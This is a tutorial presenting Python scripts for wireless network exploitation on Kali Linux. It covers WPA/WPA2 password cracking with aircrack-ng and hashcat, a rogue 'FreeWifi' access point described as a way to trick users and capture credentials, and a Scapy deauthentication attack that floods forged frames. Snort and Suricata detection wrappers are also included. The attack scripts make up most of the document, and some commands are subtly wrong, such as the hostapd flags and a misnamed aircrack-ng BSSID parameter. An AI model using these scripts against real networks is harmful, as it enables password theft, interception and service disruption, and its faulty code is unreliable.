Welcome to this Python-based toolkit for wireless network exploitation. These scripts leverage powerful libraries and tools like Scapy, Pyshark, Aircrack-ng, Hostapd, and others to perform various penetration testing techniques on wireless networks. This guide will help you understand how to utilize these advanced techniques and tools, working seamlessly on Kali Linux.

Important Prerequisites:

    Ensure that Python 3 is installed on your Kali Linux system:

python3 --version

Install necessary Python packages via pip:

    pip3 install pyshark scapy

You can also install various tools (aircrack-ng, hostapd, hashcat, etc.) on Kali by using the following command:

sudo apt install aircrack-ng hostapd hashcat pyrit snort suricata

Once your environment is set up, let’s walk through the advanced examples.
1. Packet Sniffing with Pyshark

Pyshark is a wrapper around tshark that allows you to capture and parse network traffic with ease. This is an entry-level technique for sniffing wireless packets.

import pyshark

# Capture packets on a specific interface (e.g., 'wlan0')
capture = pyshark.LiveCapture(interface='wlan0')

# Sniff packets for a defined amount of time or indefinitely
capture.sniff(timeout=50)

# Process captured packets
for packet in capture:
    print(packet.summary())  # Prints the summary of each captured packet

Explanation:

    Pyshark provides an easy interface to interact with packet capture data.

    You can use this script to monitor packets in real-time on your network interface (wlan0).

2. WPA/WPA2 Cracking with Aircrack-ng

This script demonstrates how to use aircrack-ng for WPA/WPA2 password cracking by processing a .pcap file generated during the wireless packet capture phase.

from subprocess import Popen, PIPE

def crack_wpa(network_interface, pcap_file, wordlist):
    # Execute aircrack-ng to crack WPA/WPA2 password from a capture file
    command = f"aircrack-ng -w {wordlist} -b {network_interface} {pcap_file}"
    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()

    if stderr:
        print(f"Error: {stderr.decode()}")
    print(stdout.decode())  # Prints the result of the cracking attempt

# Example usage
crack_wpa("XX:XX:XX:XX:XX:XX", "capture_file.pcap", "wordlist.txt")

Explanation:

    Aircrack-ng is one of the most widely used tools for cracking WPA/WPA2 encryption keys from captured handshake files (pcap).

    This script runs the aircrack-ng command through subprocess.Popen, allowing automated exploitation within Python.

3. Rogue Access Point Creation Using Hostapd

Setting up a rogue access point is a common technique used to trick users into connecting to your malicious network, allowing you to capture sensitive information.

from subprocess import Popen, PIPE

def create_rogue_ap(interface, ssid, channel):
    # Command to create a rogue AP with Hostapd
    command = f"hostapd -B -i {interface} -c {channel} -ssid {ssid}"
    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    
    if stderr:
        print(f"Error: {stderr.decode()}")
    print(stdout.decode())  # Logs the output from Hostapd

# Example usage: Create a rogue AP on interface wlan0 with SSID "FreeWifi"
create_rogue_ap("wlan0", "FreeWifi", "6")

Explanation:

    Hostapd allows you to create a rogue AP by broadcasting a network with a chosen SSID.

    This can be useful for performing man-in-the-middle attacks, capturing data like credentials, and more.

4. Wireless Intrusion Detection with Snort

Snort is a popular IDS that can detect malicious activity in your wireless network. This script runs Snort with a custom configuration and logs network traffic to detect threats.

from subprocess import Popen, PIPE

def run_snort_wids(interface):
    # Command to run Snort for wireless IDS
    command = f"snort -i {interface} -l /var/log/snort -c /etc/snort/snort.conf -k none"
    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()

    if stderr:
        print(f"Error: {stderr.decode()}")
    print(stdout.decode())  # Outputs Snort's analysis logs

# Example usage: Run Snort on wlan0 for intrusion detection
run_snort_wids("wlan0")

Explanation:

    Snort will log all packets it analyzes in /var/log/snort, which can be reviewed later for suspicious behavior.

    Ideal for ongoing network monitoring or when setting up a real-time detection system.

Advanced Wireless Exploitation

For more sophisticated attacks, we’ll dive into Scapy-based packet injection and deauthentication attacks, leveraging tools like Hashcat and Pyrit for advanced WPA cracking.
5. Advanced WPA/WPA2 Cracking with Hashcat

Hashcat is a fast and flexible password cracker. This script demonstrates how to use Hashcat for WPA/WPA2 passphrase cracking by attacking pre-captured hash files.

from subprocess import Popen, PIPE

def crack_wpa_hashcat(hash_file, wordlist):
    # Run Hashcat to crack WPA hashes
    command = f"hashcat -m 2500 {hash_file} {wordlist}"
    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()

    if stderr:
        print(f"Error: {stderr.decode()}")
    print(stdout.decode())  # Prints the Hashcat output

# Example usage
crack_wpa_hashcat("wpa_hash_file.hccapx", "wordlist.txt")

Explanation:

    Hashcat supports cracking WPA hashes efficiently, with multiple attack modes.

    The -m 2500 flag specifies that you're targeting WPA/WPA2 hashes, while the wordlist will provide possible passwords.

6. Deauthentication Attack with Scapy

A deauthentication attack can be used to disrupt wireless connections by sending forged deauthentication frames, effectively disconnecting devices from a network.

from scapy.all import *

def deauth_attack(interface, target_mac, ap_mac):
    # Craft deauthentication packet
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    sendp(packet, iface=interface, count=100, inter=0.1)

# Example usage: Deauth attack on a specific target MAC
deauth_attack("wlan0", "XX:XX:XX:XX:XX:XX", "YY:YY:YY:YY:YY:YY")

Explanation:

    Scapy allows you to craft and inject custom packets directly into the network.

    The deauthentication attack sends malicious frames to disconnect clients from the network, typically used in WPA cracking attempts.

7. Advanced Wireless IDS with Suricata

Suricata is a high-performance Network IDS that provides a more in-depth analysis compared to Snort, including application layer protocol decoding.

from subprocess import Popen, PIPE

def run_suricata_wids(interface):
    # Command to run Suricata with wireless network monitoring
    command = f"suricata -i {interface} -c /etc/suricata/suricata.yaml"
    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()

    if stderr:
        print(f"Error: {stderr.decode()}")
    print(stdout.decode())  # Prints Suricata's output

# Example usage: Run Suricata on wlan0
run_suricata_wids("wlan0")

Explanation:

    Suricata is a robust IDS/IPS system that can analyze large-scale network traffic in real time.

    Running Suricata helps detect advanced threats that might evade traditional firewalls or intrusion prevention systems.

Conclusion

This advanced toolkit showcases powerful Python scripts for wireless network exploitation. By combining tools like Scapy, Aircrack-ng, Hashcat, and more, you can perform various penetration testing techniques. Use these examples responsibly and always ensure that you have explicit permission before testing networks that aren't your own.
